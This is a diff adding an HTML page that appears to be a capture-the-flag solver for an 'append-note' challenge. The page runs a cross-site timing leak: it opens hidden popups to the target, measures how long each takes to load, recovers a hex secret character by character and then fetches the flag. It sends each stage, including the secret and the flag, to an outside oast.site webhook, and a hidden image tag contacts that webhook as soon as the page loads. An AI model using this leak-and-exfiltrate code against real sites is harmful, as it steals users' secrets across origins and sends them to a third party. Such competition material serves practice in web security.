@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Append-Note Solver</title>
+<style>
+body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 16px; }
+#status { font-size: 18px; margin: 12px 0; color: #58a6ff; }
+#log { background: #010409; border: 1px solid #30363d; padding: 10px; height: 420px; overflow-y: auto; font-size: 12px; }
+.ok { color: #3fb950; }
+.warn { color: #d29922; }
+.err { color: #f85149; }
+</style>
+</head>
+<body>
+<div id="status">Starting...</div>
+<div id="log"></div>
+<img alt="" style="display:none" src="https://wgke111cwekqzutsmjaxclt0cdqzf94st.oast.site?boot=1&t=static">
+
+<script>
+const TARGET = "https://append-note-a2aq0.instancer.lac.tf";
+const WEBHOOK = "https://wgke111cwekqzutsmjaxclt0cdqzf94st.oast.site";
+const DEBUG_REDIRECT = false;
+const CHARS = "0123456789abcdef";
+
+const PROBE_TIMEOUT_MS = 220;
+const BETWEEN_PROBES_MS = 0;
+const CAL_SAMPLES = 2;
+
+const $ = (id) => document.getElementById(id);
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+function log(msg, cls = "") {
+    const div = document.createElement("div");
+    div.className = cls;
+    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    $("log").appendChild(div);
+    $("log").scrollTop = 1e9;
+    console.log(msg);
+}
+
+function report(msg) {
+    const q = encodeURIComponent(msg);
+    const t = Date.now();
+    const url = WEBHOOK + "?d=" + q + "&t=" + t;
+    try { navigator.sendBeacon(WEBHOOK, msg); } catch (e) {}
+    try { fetch(url + "&m=fetch", { mode: "no-cors", method: "GET" }); } catch (e) {}
+    try { (new Image()).src = url + "&m=img"; } catch (e) {}
+    try {
+        const s = document.createElement("script");
+        s.src = url + "&m=script";
+        document.head.appendChild(s);
+    } catch (e) {}
+}
+
+report("BOOT");
+
+function setStatus(msg) {
+    $("status").textContent = msg;
+}
+
+function median(arr) {
+    const a = arr.slice().sort((x, y) => x - y);
+    return a[Math.floor(a.length / 2)];
+}
+
+function make404Sample(tag) {
+    // Any prefix containing non-hex chars can never match the secret.
+    return "g" + tag + Math.random().toString(16).slice(2);
+}
+
+async function probePrefix(prefix) {
+    const url = `${TARGET}/append?content=${encodeURIComponent(prefix)}&url=${encodeURIComponent(TARGET + "/")}`;
+    return new Promise((resolve) => {
+        const t0 = performance.now();
+        let done = false;
+        const finish = (reason) => {
+            if (done) return;
+            done = true;
+            resolve({ time: performance.now() - t0, reason });
+        };
+
+        const w = window.open(url, "p" + Math.random(), "width=1,height=1,left=-9999,top=-9999");
+        if (!w) {
+            report("ERR:popup_blocked");
+            finish("popup_blocked");
+            return;
+        }
+
+        const timer = setTimeout(() => finish("timeout"), PROBE_TIMEOUT_MS);
+        try {
+            w.addEventListener("load", () => {
+                clearTimeout(timer);
+                finish("load");
+                try { w.close(); } catch (e) {}
+            }, { once: true });
+        } catch (e) {
+            w.onload = () => {
+                clearTimeout(timer);
+                finish("load");
+                try { w.close(); } catch (e2) {}
+            };
+        }
+    });
+}
+
+async function calibrate() {
+    setStatus("Calibrating...");
+    log("Calibration start");
+
+    const t200 = [];
+    const t404 = [];
+
+    for (let i = 0; i < CAL_SAMPLES; i++) {
+        const r200 = await probePrefix("");
+        t200.push(r200.time);
+    }
+
+    for (let i = 0; i < CAL_SAMPLES; i++) {
+        const r404 = await probePrefix(make404Sample("c" + i));
+        t404.push(r404.time);
+    }
+
+    const m200 = median(t200);
+    const m404 = median(t404);
+    const faster = m200 < m404;
+
+    log(`Cal 200 median: ${m200.toFixed(2)}ms`, "ok");
+    log(`Cal 404 median: ${m404.toFixed(2)}ms`, "ok");
+    log(`Match is ${faster ? "FASTER" : "SLOWER"}`, "warn");
+    report(`CAL:200=${m200.toFixed(2)},404=${m404.toFixed(2)},match=${faster ? "fast" : "slow"}`);
+
+    return { faster };
+}
+
+async function findSecret(matchFaster) {
+    let secret = "";
+
+    for (let pos = 0; pos < 8; pos++) {
+        setStatus(`Position ${pos + 1}/8, current=${secret || "-"}`);
+        log(`Position ${pos} probing...`);
+
+        const results = [];
+        for (const c of CHARS) {
+            const tCandidate = await probePrefix(secret + c);
+            const tControl = await probePrefix(make404Sample("p" + pos + c));
+
+            const delta = tCandidate.time - tControl.time;
+            results.push({ c, tc: tCandidate.time, t0: tControl.time, d: delta });
+        }
+
+        results.sort((a, b) => a.d - b.d);
+        const winner = matchFaster ? results[0] : results[results.length - 1];
+
+        const top3 = results.slice(0, 3).map(r => `${r.c}:${r.d.toFixed(1)}`).join(" ");
+        const bot3 = results.slice(-3).map(r => `${r.c}:${r.d.toFixed(1)}`).join(" ");
+        log(`Delta top: ${top3}`, "ok");
+        log(`Delta bot: ${bot3}`, "ok");
+        log(`Winner: ${winner.c} (d=${winner.d.toFixed(2)}ms)`, "warn");
+
+        secret += winner.c;
+    }
+
+    return secret;
+}
+
+async function fetchFlag(secret) {
+    try {
+        const r = await fetch(`${TARGET}/flag?secret=${secret}`);
+        const text = await r.text();
+        return { ok: r.ok, text };
+    } catch (e) {
+        return { ok: false, text: String(e) };
+    }
+}
+
+async function main() {
+    report("START");
+    if (DEBUG_REDIRECT) {
+        setTimeout(() => {
+            try { window.location.href = WEBHOOK + "?boot=1&t=" + Date.now(); } catch (e) {}
+        }, 2500);
+    }
+    log(`Target: ${TARGET}`);
+    log(`Webhook: ${WEBHOOK}`);
+
+    const cal = await calibrate();
+    const secret = await findSecret(cal.faster);
+
+    setStatus(`Secret candidate: ${secret}`);
+    report(`SECRET=${secret}`);
+    log(`Secret candidate: ${secret}`, "warn");
+
+    const flag = await fetchFlag(secret);
+    log(`Flag response: ${flag.text}`, flag.ok ? "ok" : "err");
+    report(`FLAG=${flag.text}`);
+
+    if (!flag.ok) {
+        log("Flag check failed. Re-run with a fresh instance.", "err");
+        setStatus("Failed to fetch flag (see log).");
+        return;
+    }
+
+    setStatus(`FLAG: ${flag.text}`);
+}
+
+main().catch((e) => {
+    log(`Fatal: ${e.message}`, "err");
+    report(`ERROR=${e.message}`);
+});
+</script>
+</body>
+</html>
